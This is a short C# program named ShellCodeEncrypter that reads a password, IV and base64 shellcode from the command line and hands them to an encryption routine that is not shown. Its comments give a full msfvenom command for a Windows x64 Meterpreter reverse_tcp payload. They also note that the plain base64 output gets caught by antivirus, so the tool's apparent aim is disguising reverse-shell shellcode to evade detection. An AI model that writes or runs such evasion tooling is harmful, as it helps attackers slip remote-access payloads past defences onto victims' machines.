using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ShellCodeEncrypter
{
    class Program
    {
        static void Main(string[] args)
        {
            //Generate shellcode as b64:
            //msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=8080 -f hex|base64
            //oddly enough using the base64 format from meterpreter gets caught by my av when generating payload ;)
            var pass = args[0];
            var iv = Convert.FromBase64String(args[1]);
            var shellcode = Convert.FromBase64String(args[2]);

            Encryptor cryptor = new Encryptor();

            cryptor.CaesarEncryptShell(shellcode, pass, iv);

            Console.ReadLine();
        }
    }
}
